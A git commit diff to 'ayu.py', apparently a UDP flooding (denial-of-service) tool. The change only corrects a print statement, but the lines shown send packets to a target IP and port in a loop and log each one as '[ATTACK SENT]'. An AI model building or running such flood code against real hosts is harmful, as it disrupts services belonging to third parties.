b70c1e405980978968f6cb7dc9ca8d3a7e72ff55
kitunyacell-kun <kitunyacell@gmail.com>
2026-01-19 17:21:10 +0700

    Fix print statement to include dynamic port number

--- ayu.py
+++ ayu.py
@@ -66,7 +66,7 @@ while True:
         white.sendto(bytes, (ip, port))
         sent = sent + 1
         time.sleep(1)
-        print("\033[94m[AYU] \033[97m%s  \033[31m[ATTACK SENT]  \033[92m%s  \033[36mPort \033[33m80 " % (sent, ip, port))
+        print("\033[94m[AYU] \033[97m%s  \033[31m[ATTACK SENT]  \033[92m%s  \033[36mPort \033[33m%s " % (sent, ip, port))
     if():
         s.close
         print("\033[92mSerangan wes Rampung\033[0m")
